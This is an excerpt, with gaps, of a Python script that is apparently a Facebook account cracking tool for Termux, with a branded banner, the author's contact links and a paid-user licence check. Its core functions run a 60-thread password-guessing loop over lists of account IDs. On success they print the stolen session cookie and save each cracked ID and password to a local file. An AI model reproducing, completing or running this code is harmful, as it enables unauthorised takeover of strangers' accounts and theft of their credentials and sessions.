...
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘈𝘜𝘛𝘏𝘖𝘙      \033[1;97m  :  \033[34;1mSHAKIL   \033[38;5;46m│ \033[33;1m┫│\033[38;5;46m𝑹\033[33;1m│┣
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘎𝘐𝘛𝘏𝘜𝘉        \033[1;97m:  \033[34;1m SHAKIL-1-2     \033[38;5;46m   │  \033[33;1m┗━┛
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘞𝘏𝘈𝘛𝘚𝘈𝘗𝘗   \033[1;97m   :  \033[34;1m01752363921       \033[38;5;46m│
\033[38;5;46m│ \033[1;97m[\033[31;1m<>\033[1;97m] \033[33;1m𝘗𝘖𝘞𝘌𝘙       \033[1;97m  :  \033[34;1mSHAKIL AHMED         \033[38;5;46m│
...
def Main():
	...
	if opt in ["B","2"]:
		admin()
	if opt in ["C","3"]:
		os.system('xdg-openhttps://www.facebook.com/profile.php?id=100088805786308');time.sleep(1)
		fb()
	if opt in ["D","4"]:
		os.system('xdg-open https://wa.me/+8801752363921');time.sleep(1)
		group()
	if opt in ["0","0"]:
		exit()
...
def admin():
	...
	if bal =='1':
		...
		admin()
	if bal =='2':
		os.system('xdg-open https://www.facebook.com/profile.php?id=100088805786308');time.sleep(1)
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/SHAKIL-1-2/OKid/tree/main');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def virusA():
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print('\033[1;97m┗━[•] \033[1;92mSHAKIL  BD NAMBER MIXT CRACKING... ')
		print(50*'━')
		for guru in user:
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93mSHAKIL-143-👿\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
...
',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m [SHAKIL-143-OK🔥] '+cid+' | '+ps+'\33[0;92m')
                print(f'\r\033[1;92m=[💉]=COOKIE : '+coki)
                oks.append(cid)
                open('/sdcard/SHAKIL-1-2ok.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/Prince-150/paid/blob/main/Paid.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        os.system("xdg-open https://www.facebook.com/profile.php?id=100088805786308")
        time.sleep(3.0)
        ...
        os.system("xdg-open https://wa.me/+8801752363921")
        superuser()        
superuser()
